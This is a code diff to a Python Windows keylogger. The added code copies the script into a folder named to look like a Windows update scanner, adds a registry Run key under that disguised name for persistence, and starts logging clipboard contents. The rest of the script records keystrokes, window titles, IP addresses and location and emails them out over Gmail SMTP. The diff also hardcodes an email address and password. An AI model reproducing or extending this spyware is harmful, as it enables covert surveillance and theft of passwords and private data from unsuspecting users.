@@ -1,3 +1,4 @@
+import subprocess
 import time
 import win32gui
 import getpass
@@ -6,27 +7,69 @@ import socket
 import json
 import smtplib
 import threading
+import sys
+import os
+import shutil
+from tkinter import TclError, Tk
 from typing import final
 from pynput import keyboard
 from requests.models import Response
 from requests.sessions import PreparedRequest
 from datetime import date
-from datetime import datetime
 from urllib.request import urlopen
+from subprocess import check_output
+from subprocess import DEVNULL
 from subprocess import call
 
-call("pip install requests", shell=True)
-call("pip install pynput", shell=True)
-call("pip install pywin32", shell=True)
-
-
-my_email =  # Enter your email here (as a string)
-my_pass =  # Enter your email password here (as a string)
-
+file_path = sys.argv[0]
+file_name = __file__.split('\\')[-1]
+my_email = "pythontesting1219@gmail.com"
+my_password = "Testing95"
 
 window_log = []
 keys_pressed = []
 current_window_logs = []
+clipboard_log = []
+all_clips = []
+
+
+def make_a_substitute_dir():  # This function makes a seceret copy of the keylogger somewhere else
+    global path_of_other_folder
+
+    username = getpass.getuser()
+    path_of_other_folder = fr'C:\Users\{username}\WindowsUpdateScanner'
+    try:
+        for direct in os.listdir(path_of_other_folder):
+            d = path_of_other_folder + "\\" + direct
+            os.remove(d)
+    except Exception as e:
+        print(e)
+    if os.path.isdir(path_of_other_folder):
+        pass
+    else:
+        os.mkdir(path_of_other_folder)
+    shutil.copy2(file_path, path_of_other_folder)
+
+
+make_a_substitute_dir()
+
+
+def add_to_start():
+    path_to_add_to_reg = path_of_other_folder + \
+        "\\" + os.listdir(path_of_other_folder)[0]
+    os.system(
+        f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateScanner /t REG_SZ /d {path_to_add_to_reg} /f"')  # This command will add this file to the startup registry. It will be disguised with the name WindowsUpdateScanner
+
+
+def subprocess_commands():
+    threading.Thread(target=add_to_start).start()
+    os.system("pip install requests")  # installing modules
+    os.system("pip install pynput")
+    os.system("pip install pywin32")
+    # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user ovsiously can't answer the input.
+
+
+subprocess_commands()
 
 
 def log_window():
@@ -42,8 +85,7 @@ def log_window():
             username = getpass.getuser()
             today = date.today()
             current_date = today.strftime('%m/%d/%y')
-            current_time = datetime.now()
-            current_time = current_time.strftime("%I:%M:%S")
+            current_time = time.strftime("%I:%M:%S %p")
             date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'
 
             window_log.append(date_and_window)
@@ -53,11 +95,36 @@ def log_window():
         username = getpass.getuser()
         today = date.today()
         current_date = today.strftime('%m/%d/%y')
-        current_time = datetime.now()
-        current_time = current_time.strftime("%H:%M")
+        current_time = time.strftime("%I:%M:%S %p")
         date_and_window = f'On {current_date} at {current_time}, the user "{username}", was at "{current_window}"'
-        print('index error')
         window_log.append(date_and_window)
+
+
+def clipboard_logger():
+    global all_clips
+    try:
+        try:
+            clipboard_data = Tk().clipboard_get()
+        except TclError:
+            clipboard_data = ''
+            # This means that nothing is copied to their clipboard
+
+        # print(
+        #     f'clip data: {clipboard_data}\n\nall clips -2: {all_clips[-1]}')
+        if clipboard_data == all_clips[-1]:
+            pass
+        else:
+            username = getpass.getuser()
+            today = date.today()
+            current_date = today.strftime('%m/%d/%y')
+            current_time = time.strftime("%I:%M:%S %p")
+            date_and_clip = f'On {current_date} at {current_time}, the user "{username}", copied: {clipboard_data}"'
+            clipboard_log.append(date_and_clip)
+        all_clips.append(clipboard_data)
+    except IndexError:
+        all_clips.append(clipboard_data)
+    except TclError:
+        pass
 
 
 def keylogger():
@@ -78,11 +145,18 @@ def keylogger():
 
     def thread_to_start_check_keys():
         while True:
+            time.sleep(.5)
             check_keys()
 
     def thread_for_window_logger():
         while True:
+            time.sleep(.5)
             log_window()
+
+    def thread_for_clip_logger():
+        while True:
+            time.sleep(.5)
+            clipboard_logger()
 
     def listen():
         def on_press(key):
@@ -106,13 +180,13 @@ def keylogger():
                         keys_pressed.append(f' ')
                 else:
                     keys_pressed.append(str(key))
-
         with keyboard.Listener(
                 on_press=on_press) as listener:
             listener.join()
 
     threading.Thread(target=thread_to_start_check_keys).start()
     threading.Thread(target=thread_for_window_logger).start()
+    threading.Thread(target=thread_for_clip_logger).start()
     listen()
 
 
@@ -141,25 +215,29 @@ def send_email():
 
         window_log_to_send = '\n'.join(window_log)
         keys_pressed_to_send = ''.join(keys_pressed)
-        final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\n{window_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
+        clipboard_log_to_send = '\n'.join(clipboard_log)
+        final_target_info = f'\n\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\n\n{get_location()}\n\nWindow Log:\n{window_log_to_send}\n\nClipboard Log:\n{clipboard_log_to_send}\n\nKeys pressed: {keys_pressed_to_send}'
         keys_pressed_to_send = ''
         window_log_to_send = ''
 
     def compile_and_send_email():
         global window_log
         global keys_pressed
+        global clipboard_log
+        global all_clips
 
         email_message = final_target_info
-        print(str(email_message))
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         email = my_email
-        password = my_pass
+        password = my_password
         server.login(email, password)
         server.sendmail(email, email, str(
             email_message).encode("ascii", "ignore"))
         window_log = []
         keys_pressed = []
+        clipboard_log = []
+        all_clips = []
     get_target_info()
     compile_and_send_email()
 
